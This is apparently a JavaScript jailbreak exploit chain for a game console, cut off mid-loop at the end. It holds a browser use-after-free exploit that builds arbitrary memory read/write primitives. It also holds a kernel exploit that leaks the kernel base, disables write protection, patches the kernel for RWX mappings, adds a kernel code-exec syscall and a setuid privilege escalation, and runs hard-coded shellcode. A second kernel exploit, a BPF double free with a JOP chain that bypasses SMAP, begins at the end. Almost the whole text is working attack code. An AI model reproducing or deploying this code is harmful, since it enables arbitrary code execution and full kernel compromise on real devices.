	try {
   /*
      Set each integer in the stackframe to it's index, this way we can peek
      the stack to align it
    */
    for(var i = 0; i < 0xFFFF; i++)
      stackFrame[i] = i;

    /*
      Attempt to poke and peek the stack. If the peek returns null, it means
      the out-of-bounds read failed, throw an exception and catch it.
    */
    frameIndex = 0;
    poke_stack(0);

    if (peek_stack() == undefined)
      throw "System is not vulnerable!";

    /* Setup our stack frame so our target object reference resides inside of it */
    frameIndex = 0;
    poke_stack(0);

    peek_stack();
    frameIndex = stackPeek;

    /* Align the stack frame */
    poke_stack(0x4141);

    for (var align = 0; align < 8; align++)
      (function(){})();

    /* Test if we aligned our stack frame properly, if not throw exception and catch */
    peek_stack();

    if (stackPeek != 0x4141)
      throw "Couldn't align stack frame to stack!";

    /* Setup spray to overwrite the length header in UAF'd object's butterfly */
    var butterflySpray = new Array(0x1000);

    for (var i = 0; i < 0x1000; i++) {
      butterflySpray[i] = [];

      for (var k = 0; k < 0x40; k++)
        butterflySpray[i][k] = 0x42424242;

      butterflySpray[i].unshift(butterflySpray[i].shift());
    }

    /* Spray marked space */
    var sprayOne = new Array(0x100);

    for (var i = 0; i < 0x100; i++) {
      sprayOne[i] = [1];

      if (!(i & 3)) {
        for (var k = 0; k < 0x8; k++)
          sprayOne[i][k] = 0x43434343;
      }

      sprayOne[i].unshift(sprayOne[i].shift());
    }

    var sprayTwo = new Array(0x400);

    for (var i = 0; i < 0x400; i++) {
      sprayTwo[i] = [2];

      if (!(i & 3)) {
        for (var k = 0; k < 0x80; k++)
          sprayTwo[i][k] = 0x43434343;
      }

      sprayTwo[i].unshift(sprayTwo[i].shift());
    }

    /* Setup target object for UAF, spray */
    var uafTarget = [];

    for (var i = 0; i < 0x80; i++)
      uafTarget[i] = 0x42420000;

    /* Store target on the stack to maintain a reference after forced garbage collection */
    poke_stack(uafTarget);

    /* Remove references so they're free'd when garbage collection occurs */
    uafTarget = 0;
    sprayOne = 0;
    sprayTwo = 0;

    /* Force garbage collection */
    for (var k = 0; k < 4; k++)
      doGarbageCollection();

    /* Re-collect our maintained reference from the stack */
    peek_stack();
    uafTarget = stackPeek;

    stackPeek = 0;

    /*
      We now have access to uninitialized memory, force a heap overflow by
      overwriting the "length" field of our UAF'd object's butterfly via spraying
    */
    for (var i = 0; i < 0x1000; i++) {
      for (var k = 0x0; k < 0x80; k++) {
        butterflySpray[i][k] = 0x7FFFFFFF;

        /*
          Find our UAF'd object via modified length, which should be the maximum
          value for a 32-bit integer. If it is, we've successfully primitive our
          butterfly's length header!
        */
        if (uafTarget.length == 0x7FFFFFFF) {
          /* Store index of butterfly for UAF'd object for primitiveSpray */
          var butterflyIndex = i;

          /* Remove all references except what we need to free memory */
          for (var i = 0; i < butterflyIndex; i++)
            butterflySpray[i] = 0;

          for (var i = butterflyIndex + 1; i < 0x1000; i++)
            butterflySpray[i] = 0;

          doGarbageCollection();

          /* Spray to obtain a read/write primitive */
          var primitiveSpray = new Array(0x20000);
          var potentialPrim = new ArrayBuffer(0x1000);

          for (var i = 0; i < 0x20000; i++)
            primitiveSpray[i] = i;

          var overlap = new Array(0x80);

          /* Setup potential uint32array slaves for our read/write primitive */
          for (var i = 0; i < 0x20000; i++)
            primitiveSpray[i] = new Uint32Array(potentialPrim);

          /* Find a slave uint32array from earlier spray */
          var currentQword = 0x10000;
          var found = false;
          var smashedButterfly = new int64(0,0);
          var origData = new int64(0, 0);
          var locateHelper = new int64(0, 0);

          while (!found) {
            /*
              Change qword value for uint32array size to 0x1337 in UAF'd object
              to defeat U-ASLR
            */
            var savedVal = uafTarget[currentQword];
            uafTarget[currentQword] = 0x1337;

            /* Check sprayed uint32array slaves for modified size */
            for (var i = 0; i < 0x20000; i++) {
              if (primitiveSpray[i] && primitiveSpray[i].byteLength != 0x1000) {
                /*
                  Found our primitive! Restore uint32array size as 0x1000 is
                  sufficient.
                */
                uafTarget[currentQword] = savedVal;

                var primitive = primitiveSpray[i];
                var overlap = [1337];

                uafTarget[currentQword - 5] = overlap;

                smashedButterfly.low  = primitive[2];
                smashedButterfly.hi   = primitive[3];
                smashedButterfly.keep_gc = overlap;

                /* Find previous ArrayBufferView */
                uafTarget[currentQword - 5] = uafTarget[currentQword - 2];

                butterflySpray[butterflyIndex][k] = 0;

                origData.low = primitive[4];
                origData.hi  = primitive[5];

                primitive[4]  = primitive[12];
                primitive[5]  = primitive[13];
                primitive[14] = 0x40;

                /* Find our uint32array slave for writing values */
                var slave = undefined;

                for (var k = 0; k < 0x20000; k++) {
                  if (primitiveSpray[k].length == 0x40) {
                    slave = primitiveSpray[k];
                    break;
                  }
                }

                if(!slave)
                  throw "Could not find slave for write primitive!";

                /* Set primitive address to that of the smashed butterfly's */
                primitive[4] = smashedButterfly.low;
                primitive[5] = smashedButterfly.hi;

                /* Setup primitive and slave for primitive functions */
                overlap[0] = uafTarget;

                var targetEntry = new int64(slave[0], slave[1]);

                primitive[4] = targetEntry.low;
                primitive[5] = targetEntry.hi;
                slave[2] = 0;
                slave[3] = 0;

                /* Clear references for future collection from GC */
                uafTarget = 0;
                primitiveSpray = 0;

                /* Finally restore primitive address to it's original state */
                primitive[4] = origData.low;
                primitive[5] = origData.hi;
				
                /*
                  Derive primitive functions
                */
				var prim = {
					write8: function (addr, val) {
						primitive[4] = addr.low;
						primitive[5] = addr.hi;

						if (val == undefined)
						{
						val = new int64(0,0);
						}
						if (!(val instanceof int64))
						{
						val = new int64(val,0);
						}

						slave[0] = val.low;
						slave[1] = val.hi;

						primitive[4] = origData.low;
						primitive[5] = origData.hi;
					},

					write4: function (addr, val) {
						primitive[4] = addr.low;
						primitive[5] = addr.hi;

						slave[0] = val;

						primitive[4] = origData.low;
						primitive[5] = origData.hi;
					},

					read8: function (addr) {
						primitive[4] = addr.low;
						primitive[5] = addr.hi;

						var rtv = new int64(slave[0], slave[1]);

						primitive[4] = origData.low;
						primitive[5] = origData.hi;

						return rtv;
					},

					// Add to wk_expl.js after read8 defintion

					readable_read8: function (addr) {
						primitive[4] = addr.low;
						primitive[5] = addr.hi;
						
						var t0 = slave[0].toString(16);
						var t1 = slave[1].toString(16);
						
						var addZeroes = function (string8) {
							var newString8 = "0";
							var toAdd = 8 - string8.length;
							if (toAdd != 0) {
								//print("toAdd >" + toAdd);
								for (i = 1; i < toAdd; i++)
									newString8 += "0";
								//print(newString8 + string8);
								return newString8 + string8;
							}
							//print("toAdd >" + toAdd);
							//print(string8);
							return string8;
						};
						
						//print(t0 + ":"+ t0.length);
						var newT0 = addZeroes(t0).match(/[a-fA-F0-9]{2}/g).reverse().join('');
						//print(newT0);
						//print(t1 + ":"+ t1.length);
						var newT1 = addZeroes(t1).match(/[a-fA-F0-9]{2}/g).reverse().join('');
						//print(newT1);
						
						primitive[4] = origData.low;
						primitive[5] = origData.hi;
						return newT0 + newT1;
					},
					
					read4: function (addr) {
						primitive[4] = addr.low;
						primitive[5] = addr.hi;

						var rtv = slave[0];

						primitive[4] = origData.low;
						primitive[5] = origData.hi;

						return rtv;
					},

					leakval: function (jsval) {
						primitive[4] = smashedButterfly.low;
						primitive[5] = smashedButterfly.hi;
						overlap[0] = jsval;
						var val = new int64(slave[0], slave[1]);
						slave[0] = 1337;
						slave[1] = 0xffff0000;
						primitive[4] = origData.low;
						primitive[5] = origData.hi;
						return val;
					},

					createval: function (jsval) {
						primitive[4] = smashedButterfly.low;
						primitive[5] = smashedButterfly.hi;
						slave[0] = jsval.low;
						slave[1] = jsval.hi;
						var jsval = overlap[0];
						slave[0] = 1337;
						slave[1] = 0xffff0000;
						primitive[4] = origData.low;
						primitive[5] = origData.hi;
						return jsval;
					}
				};
				
                if (prim.createval(prim.leakval(0x1337)) != 0x1337)
                  throw "Primitive is broken, jsvalue leaked does not match jsvalue created!";
                var testData = [1,2,3,4,5,6,7,8];
                var testAddr = prim.leakval(testData);
                var butterflyAddr = prim.read8(testAddr.add32(8));
                if ((butterflyAddr.low == 0 && butterflyAddr.hi == 0) || prim.createval(prim.read8(butterflyAddr)) != 1)
                  throw "Primitive is broken, either butterfly address is null or object is not a valid jsvalue!";
				
				window.prim = prim;
				if (window.postExpl)
					window.stage2();
              }
            }
            uafTarget[currentQword] = savedVal;
            currentQword ++;
          }
        }
      }
    }
	
    /*
      If we ended up here, the exploit failed to find our resized object/we were
      not able to modify the UaF'd target's length :(
    */
	window.log("exploit_StackUnitializedRead: UaF not modified", "red");
    return 1;
	
	} catch(e) {
		failed = true
		fail("Exception: " + e)
	}
}

//================================================================================================
// Kernel Exploit: namedobj
//================================================================================================
function getKernelBase_namedobj() {
	// Setup Buffers related to leaking
	var leakData = p.malloc(0x4C0);
	var leakScePThrPtr = p.malloc(0x08);

	p.fcall(window.gadgets["scePthreadCreate"], leakScePThrPtr, 0, window.gadgets["infloop"], leakData, p.stringify("leakThr"));

	//////////////// LEAK ////////////////
	
	var stage1 = new rop();
	stage1.fcall(window.syscalls[window.syscallnames['sys_thr_suspend_ucontext']], p.read4(p.read8(leakScePThrPtr)));
	stage1.fcall(window.syscalls[window.syscallnames['sys_open']], p.stringify("/dev/dipsw"), 0, 0);
	stage1.fcall(window.syscalls[window.syscallnames['sys_thr_get_ucontext']], p.read4(p.read8(leakScePThrPtr)), leakData);
	stage1.run();

	var kernelBase = p.read8(leakData.add32(0x128)).sub32(window.kernel_offsets["_vn_lock_break_slide"]); // slide (break instruction in _vn_lock)
	// Leak integrity check: kASLR defeat check
	if (kernelBase.low & 0x3FFF)
		window.log("Bad leak!", "red");
	
	return kernelBase;
}

function kernExploit_namedobj() {
	try {
		//alert("Starting namedobj kexploit");
		
		//////////////// SETUP ////////////////

        // Setup buffers for important pre-exploit stuff
        var kernelBase = p.malloc(0x08);
        var objBase = p.malloc(0x08);
        var stackLeakFix = p.malloc(0x08);

        var namedObj = p.malloc(0x08);
        var serviceBuff = p.malloc(0x80);

        var obj_cdev_priv = p.malloc(0x180);
        var obj_cdevsw = p.malloc(0x0B0);

        var kernelBase = p.malloc(0x08);

        // File descriptor for target
        var targetDevFd = p.malloc(0x08);

        // Setup Buffers related to leaking
        var leakData = p.malloc(0x4C0);
        var leakScePThrPtr = p.malloc(0x08);

        var createLeakThr = p.fcall(window.gadgets["scePthreadCreate"], leakScePThrPtr, 0, window.gadgets["infloop"], leakData, p.stringify("leakThr"));

        //////////////// LEAK ////////////////

        //alert("Calculating ASLR and Object Base...");

        p.write8(namedObj, p.syscall('sys_namedobj_create', p.stringify("debug"), 0xDEAD, 0x5000));

        var stage1 = new rop();
        stage1.fcall(window.syscalls[window.syscallnames['sys_thr_suspend_ucontext']], p.read4(p.read8(leakScePThrPtr)));
        stage1.fcall(window.syscalls[window.syscallnames['sys_open']], p.stringify("/dev/dipsw"), 0, 0);
        stage1.saveReturnValue(targetDevFd);
        stage1.fcall(window.syscalls[window.syscallnames['sys_thr_get_ucontext']], p.read4(p.read8(leakScePThrPtr)), leakData);
        stage1.run();

        // Extract leaks
        kernelBase = p.read8(leakData.add32(0x128)).sub32(window.kernel_offsets["_vn_lock_break_slide"]);
        objBase = p.read8(leakData.add32(0x130));
        stackLeakFix = p.read8(leakData.add32(0x20));

        // Leak integrity check: kASLR defeat check
        if (kernelBase.low & 0x3FFF) {
          window.log("Bad leak! Terminating.", "red");
          return false;
        }

        p.write8(serviceBuff.add32(0x4), objBase);
        p.writestr(serviceBuff.add32(0x28), "debug");

        //////////////// BUILD KROP CHAIN ////////////////

        var kchainstack = p.malloc(0x200);
        var kchain = new kropchain(kchainstack);

		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			kchain.write64(kernelBase.add32(dest_offset), patch_data_qword);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			kchain.write64(kernelBase.add32(dest_offset), kernelBase.add32(src_offset));
		}
		
        // Disable kernel write protection
        kchain.push(window.gadgets["pop rax"]);
        kchain.push(0x80040033);
        kchain.push(kernelBase.add32(window.kernel_offsets["mov cr0, rax"]));

        // Fix cdev_priv->cdp_c->si_devsw
        kchain.write64(objBase.add32(0xB8), kernelBase.add32(0x1926550));

        // Patch sys_mmap: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
        
		// Patch sys_mprotect: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
		
        // Patch syscall: syscall instruction allowed anywhere
		//kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
		kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));
		
        // Patch sys_dynlib_dlsym: Allow from anywhere
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));
		
        // Add custom sys_exec() call to execute arbitrary code as kernel
		kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
		kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
		kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
		
        // Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
		kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
		
        // Fix object
        kchain.push(window.gadgets["pop rax"]);
        kchain.push(kernelBase.add32(0x19536E0));
        kchain.push(window.gadgets["mov rax, [rax]"]);
        kchain.push(window.gadgets["pop rdi"]);
        kchain.push(objBase.add32(0x50));
        kchain.push(window.gadgets["mov [rdi], rax"]);

        // Exit kernel ROP chain
        kchain.push(window.gadgets["pop rax"]);
        kchain.push(stackLeakFix.add32(0x3C0));
        kchain.push(window.gadgets["pop rcx"]);
        kchain.push(window.gadgets["pop rsp"]);
        kchain.push(window.gadgets["push rax; jmp rcx"]);

        //alert("KROP chain size: " + kchain.count);

        //////////////// FAKE THE OBJECT ////////////////

        //////// FAKE CDEV_PRIV ////////
        p.write8(obj_cdev_priv.add32(0x008), 0x0000000000000004);

        p.write8(obj_cdev_priv.add32(0x048), 0x00000000000001A4);
        p.write8(obj_cdev_priv.add32(0x058), 0x0000001000000000); // Fix
        p.write8(obj_cdev_priv.add32(0x060), 0x0000000000000004);
        p.write8(obj_cdev_priv.add32(0x068), kernelBase.add32(0x19265F8));

        p.write8(obj_cdev_priv.add32(0x0A0), objBase.add32(0x0E0));
        p.write8(obj_cdev_priv.add32(0x0B8), obj_cdevsw); // Target Object
        p.write8(obj_cdev_priv.add32(0x0C0), 0x0000000000010000);
        p.write8(obj_cdev_priv.add32(0x0C8), 0x0000000000000001);
        p.write8(obj_cdev_priv.add32(0x0E0), window.gadgets["ret"]); // New RIP value for stack pivot
        p.write8(obj_cdev_priv.add32(0x0F0), objBase); // Use as a back pointer to the object
        p.write8(obj_cdev_priv.add32(0x0F8), kchainstack); // New RSP value for stack pivot

        //////// FAKE CDEVSW ////////
        p.write8(obj_cdevsw.add32(0x38), window.o2lc(0xA826F)); // d_ioctl - TARGET FUNCTION POINTER

        //////////////// FREE THE OBJECT ////////////////
		
        var stage3 = new rop();
        stage3.fcall(window.syscalls[window.syscallnames['sys_mdbg_service']], 1, serviceBuff, 0);
        stage3.fcall(window.syscalls[window.syscallnames['sys_namedobj_delete']], p.read8(namedObj), 0x5000);

        // Spraying the heap!
        for (var i = 0; i < 500; i++)
          stage3.fcall(window.syscalls[window.syscallnames['sys_ioctl']], 0xDEADBEEF, 0x81200000, obj_cdev_priv);
        stage3.run();

        //////////////// TRIGGER ////////////////
		
        // Triggering kernel code execution
        p.syscall('sys_ioctl', p.read8(targetDevFd), 0x81200000, obj_cdev_priv);

        //////////////// FIX ////////////////
		
        // Allocating executable memory for fix payload...

        var baseAddressExecute = new int64(0xDEAD0000, 0);
        var exploitExecuteAddress = p.syscall("sys_mmap", baseAddressExecute, 0x10000, 7, 0x1000, -1, 0);

        var executeSegment = new memory(exploitExecuteAddress);

        var objBaseStore = executeSegment.allocate(0x8);
        var shellcode = executeSegment.allocate(0x200);

        p.write8(objBaseStore, objBase);

        p.write4(shellcode.add32(0x00000000), 0x00000be9);
        p.write4(shellcode.add32(0x00000004), 0x90909000);
        p.write4(shellcode.add32(0x00000008), 0x90909090);
        p.write4(shellcode.add32(0x0000000c), 0x90909090);
        p.write4(shellcode.add32(0x00000010), 0x0082b955);
        p.write4(shellcode.add32(0x00000014), 0x8948c000);
        p.write4(shellcode.add32(0x00000018), 0x415741e5);
        p.write4(shellcode.add32(0x0000001c), 0x41554156);
        p.write4(shellcode.add32(0x00000020), 0x83485354);
        p.write4(shellcode.add32(0x00000024), 0x320f18ec);
        p.write4(shellcode.add32(0x00000028), 0x89d58949);
        p.write4(shellcode.add32(0x0000002c), 0x64b948c0);
        p.write4(shellcode.add32(0x00000030), 0x77737069);
        p.write4(shellcode.add32(0x00000034), 0x49000000);
        p.write4(shellcode.add32(0x00000038), 0x4120e5c1);
        p.write4(shellcode.add32(0x0000003c), 0x000200bc);
        p.write4(shellcode.add32(0x00000040), 0xc5094900);
        p.write4(shellcode.add32(0x00000044), 0xd0b58d4d);
        p.write4(shellcode.add32(0x00000048), 0x49ffcf14);
        p.write4(shellcode.add32(0x0000004c), 0x8a509d8d);
        p.write4(shellcode.add32(0x00000050), 0x81490003);
        p.write4(shellcode.add32(0x00000054), 0x030b50c5);
        p.write4(shellcode.add32(0x00000058), 0x868d4901);
        p.write4(shellcode.add32(0x0000005c), 0x001d18d0);
        p.write4(shellcode.add32(0x00000060), 0x00c68149);
        p.write4(shellcode.add32(0x00000064), 0x48001d17);
        p.write4(shellcode.add32(0x00000068), 0x48c04589);
        p.write4(shellcode.add32(0x0000006c), 0xad0000a1);
        p.write4(shellcode.add32(0x00000070), 0x000000de);
        p.write4(shellcode.add32(0x00000074), 0x45894800);
        p.write4(shellcode.add32(0x00000078), 0x888948c8);
        p.write4(shellcode.add32(0x0000007c), 0x000000e0);
        p.write4(shellcode.add32(0x00000080), 0xf080c748);
        p.write4(shellcode.add32(0x00000084), 0x00000000);
        p.write4(shellcode.add32(0x00000088), 0x48000000);
        p.write4(shellcode.add32(0x0000008c), 0x00f880c7);
        p.write4(shellcode.add32(0x00000090), 0x00000000);
        p.write4(shellcode.add32(0x00000094), 0x1aeb0000);
        p.write4(shellcode.add32(0x00000098), 0x00841f0f);
        p.write4(shellcode.add32(0x0000009c), 0x00000000);
        p.write4(shellcode.add32(0x000000a0), 0x4cee894c);
        p.write4(shellcode.add32(0x000000a4), 0x8b48ff89);
        p.write4(shellcode.add32(0x000000a8), 0xd0ffc045);
        p.write4(shellcode.add32(0x000000ac), 0x01ec8341);
        p.write4(shellcode.add32(0x000000b0), 0x02ba2774);
        p.write4(shellcode.add32(0x000000b4), 0x4c000000);
        p.write4(shellcode.add32(0x000000b8), 0x80bfee89);
        p.write4(shellcode.add32(0x000000bc), 0x41000001);
        p.write4(shellcode.add32(0x000000c0), 0x8d48d6ff);
        p.write4(shellcode.add32(0x000000c4), 0x00006f3d);
        p.write4(shellcode.add32(0x000000c8), 0xc7894900);
        p.write4(shellcode.add32(0x000000cc), 0x31c68948);
        p.write4(shellcode.add32(0x000000d0), 0x4cd3ffc0);
        p.write4(shellcode.add32(0x000000d4), 0x75c87d39);
        p.write4(shellcode.add32(0x000000d8), 0xe43145c7);
        p.write4(shellcode.add32(0x000000dc), 0xc8758b48);
        p.write4(shellcode.add32(0x000000e0), 0x5f3d8d48);
        p.write4(shellcode.add32(0x000000e4), 0x31000000);
        p.write4(shellcode.add32(0x000000e8), 0x0fd3ffc0);
        p.write4(shellcode.add32(0x000000ec), 0x0000441f);
        p.write4(shellcode.add32(0x000000f0), 0x0000a148);
        p.write4(shellcode.add32(0x000000f4), 0x0000dead);
        p.write4(shellcode.add32(0x000000f8), 0x89440000);
        p.write4(shellcode.add32(0x000000fc), 0x3d8d48e6);
        p.write4(shellcode.add32(0x00000100), 0x0000005c);
        p.write4(shellcode.add32(0x00000104), 0x20148b4a);
        p.write4(shellcode.add32(0x00000108), 0x08c48349);
        p.write4(shellcode.add32(0x0000010c), 0xd3ffc031);
        p.write4(shellcode.add32(0x00000110), 0x80fc8149);
        p.write4(shellcode.add32(0x00000114), 0x75000001);
        p.write4(shellcode.add32(0x00000118), 0x3d8d48d7);
        p.write4(shellcode.add32(0x0000011c), 0x00000060);
        p.write4(shellcode.add32(0x00000120), 0xd3ffc031);
        p.write4(shellcode.add32(0x00000124), 0x18c48348);
        p.write4(shellcode.add32(0x00000128), 0x415bc031);
        p.write4(shellcode.add32(0x0000012c), 0x415d415c);
        p.write4(shellcode.add32(0x00000130), 0x5d5f415e);
        p.write4(shellcode.add32(0x00000134), 0x909090c3);
        p.write4(shellcode.add32(0x00000138), 0x6f6c6c41);
        p.write4(shellcode.add32(0x0000013c), 0x30203a63);
        p.write4(shellcode.add32(0x00000140), 0x786c2578);
        p.write4(shellcode.add32(0x00000144), 0x624f000a);
        p.write4(shellcode.add32(0x00000148), 0x7463656a);
        p.write4(shellcode.add32(0x0000014c), 0x6d754420);
        p.write4(shellcode.add32(0x00000150), 0x78302070);
        p.write4(shellcode.add32(0x00000154), 0x0a786c25);
        p.write4(shellcode.add32(0x00000158), 0x00000000);
        p.write4(shellcode.add32(0x0000015c), 0x00000000);
        p.write4(shellcode.add32(0x00000160), 0x6265443c);
        p.write4(shellcode.add32(0x00000164), 0x203e6775);
        p.write4(shellcode.add32(0x00000168), 0x656a624f);
        p.write4(shellcode.add32(0x0000016c), 0x2b207463);
        p.write4(shellcode.add32(0x00000170), 0x25783020);
        p.write4(shellcode.add32(0x00000174), 0x3a783330);
        p.write4(shellcode.add32(0x00000178), 0x25783020);
        p.write4(shellcode.add32(0x0000017c), 0x000a786c);
        p.write4(shellcode.add32(0x00000180), 0x6265443c);
        p.write4(shellcode.add32(0x00000184), 0x203e6775);
        p.write4(shellcode.add32(0x00000188), 0x7473754a);
        p.write4(shellcode.add32(0x0000018c), 0x726f4620);
        p.write4(shellcode.add32(0x00000190), 0x7468203a);
        p.write4(shellcode.add32(0x00000194), 0x3a737074);
        p.write4(shellcode.add32(0x00000198), 0x77772f2f);
        p.write4(shellcode.add32(0x0000019c), 0x6f792e77);
        p.write4(shellcode.add32(0x000001a0), 0x62757475);
        p.write4(shellcode.add32(0x000001a4), 0x6f632e65);
        p.write4(shellcode.add32(0x000001a8), 0x61772f6d);
        p.write4(shellcode.add32(0x000001ac), 0x3f686374);
        p.write4(shellcode.add32(0x000001b0), 0x4a563d76);
        p.write4(shellcode.add32(0x000001b4), 0x6d6c5247);
        p.write4(shellcode.add32(0x000001b8), 0x4c6c6133);
        p.write4(shellcode.add32(0x000001bc), 0x00000a59);

        // Running fix payload...
        var stage6 = new rop();
        stage6.push(window.gadgets["pop rax"]);
        stage6.push(11);
        stage6.push(window.gadgets["pop rdi"]);
        stage6.push(shellcode);
        stage6.push(window.o2lk(0x29CA)); // "syscall" gadget		
        stage6.run();
		
		if (p.syscall("sys_setuid", 0) == 0)
			return true;
		else
			throw "Kernel exploit failed!";
		return false;
		
	} catch(ex) {
		fail(ex);
		return false;
	}
	
	// failed (should never go here)
	return false;
}

//================================================================================================
// Kernel Exploit: BPF Double Free
//================================================================================================
function kernExploit_bpf_double_free() {
	try {
		var dump_size = 0x69B8000;
		
		// 1. Open /dev/bpf0 to acquire a reference to a BPF device
		
		var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		if (fd == (-1 >>> 0))
			throw "Failed to open first /dev/bpf0 device!"
		var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		if (fd1 < 0)
			throw "Failed to open second /dev/bpf0 device!";
		
		// 2. Write BPF programs
		
		var bpf_valid = p.malloc32(0x4000);
		var bpf_spray = p.malloc32(0x4000);
		var bpf_valid_u32 = bpf_valid.backing;
		
		var bpf_valid_prog = p.malloc(0x40);
		p.write8(bpf_valid_prog, 0x800 / 8);
		p.write8(bpf_valid_prog.add32(8), bpf_valid);
		
		var bpf_spray_prog = p.malloc(0x40);
		p.write8(bpf_spray_prog, 0x800 / 8);
		p.write8(bpf_spray_prog.add32(8), bpf_spray);
		
		for (var i = 0; i < 0x400;) { // Fill valid BPF program with BPF "NOPs"
			bpf_valid_u32[i++] = 6; // BPF_RET
			bpf_valid_u32[i++] = 0; // 0
		}
		
		if (p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog).low != 0) // Load valid BPF program in a BPF device
			throw "Failed to open bpf device!";
		
		// Start setting up kernel ROP chain
		var krop = new rop();
		var kscratch = p.malloc32(0x1000);
		var ctxp = p.malloc32(0x1000); // ctxp = knote
		var ctxp1 = p.malloc32(0x1000); // ctxp1 = knote->kn_fops
		var ctxp2 = p.malloc32(0x1000);
		
		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			krop.push(window.gadgets["pop rax"]);
			krop.push(dest_offset);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kscratch);			
			krop.push(window.gadgets["add rax, [rdi]"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(patch_data_qword);
			krop.push(window.gadgets["mov [rdx], rax"]);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(dest_offset);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(src_offset);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov [rdx], rax"]);
		}

		/**
			* Qwerty Madness!
			* -
			* This section contains magic. It's for bypassing Sony's ghetto "SMAP".
			* Need to be a level 99 mage to understand this completely (not really but kinda). ~ Specter and CelesteBlue
		**/
		
		var stackshift_from_retaddr = 0;
		
		p.write8(bpf_spray.add32(0x10), ctxp); // Spray heap with the fake knote object
		p.write8(ctxp.add32(0x50), 0); // Set knote->kn_status to 0 to detach (clear flags so detach is called)
		p.write8(ctxp.add32(0x68), ctxp1); // Set knote->kn_fops to fake function table
		
		//p.write8(ctxp1.add32(0x10), window.gadgets["infloop"]); // Set kn_fops->f_detach to first JOP gadget
		p.write8(ctxp1.add32(0x10), window.gadgets["jop1"]); // Set kn_fops->f_detach to first JOP gadget
		stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
		
		p.write8(ctxp.add32(0x00), ctxp2); // Set kn_link (set rdi) - not important for kqueue per se, but for the JOP gadget
		p.write8(ctxp.add32(0x10), ctxp2.add32(0x08));
		//p.write8(ctxp2.add32(window.gadgets_shift["jump_shift_jop1"]), window.gadgets["infloop"]); // Chain to next gadget
		p.write8(ctxp2.add32(window.gadgets_shift["jump_shift_jop1"]), window.gadgets["jop2"]); // Chain to next gadget
		
		var iterbase = ctxp2;
		
		for (var i = 0; i < 0xF; i++) {
			p.write8(iterbase, window.gadgets["jop1"]); // Chain to next gadget
			stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
			
			p.write8(iterbase.add32(window.gadgets_shift["jump_shift_jop1"] + 0x20), window.gadgets["jop2"]); // Chain to next gadget
			
			p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
			p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
			iterbase = iterbase.add32(0x20);
		}
		
		var raxbase = iterbase;
		var rdibase = iterbase.add32(0x08);
		var memcpy = p.read8(get_jmptgt(window.gadgets["memcpy"]));
		
		//p.write8(raxbase, window.gadgets["infloop"]); // Chain to next gadget
		p.write8(raxbase, window.gadgets["jop3"]); // Chain to next gadget
		stackshift_from_retaddr += 0x8;
		
		//p.write8(rdibase.add32(0x70), window.gadgets["infloop"]); // Chain to next gadget
		p.write8(rdibase.add32(0x70), window.gadgets["jop4"]); // Chain to next gadget
		if (window.ps4_fw >= 450)
			stackshift_from_retaddr += 0x8;
		
		p.write8(rdibase.add32(0x18), rdibase); // Set RDI to rdibase
		p.write8(rdibase.add32(0x08), krop.stackBase); // Set RSI to kROP stack location
		p.write8(raxbase.add32(0x30), window.gadgets["jop_mov rbp, rsp"]); // Save RSP to RBP
		
		p.write8(rdibase, raxbase); // [rdi] = rax
		p.write8(raxbase.add32(window.gadgets_shift["jump_shift_jop5"]), window.gadgets["jop6"]); // Chain to next gadget
		stackshift_from_retaddr += window.gadgets_shift["stackshift_jop6"];
		
		var topofchain = stackshift_from_retaddr;
		p.write8(raxbase.add32(window.gadgets_shift["jump_shift_jop6"]), memcpy.add32(0xC2 - 0x90)); // Chain to memcpy - skip prolog covering side effecting branch and skipping optimizations
		p.write8(rdibase.add32(0xB0), topofchain); // Set RDX to the write size for memcpy
		
		for (var i = 0; i < 0x1000 / 8; i++)
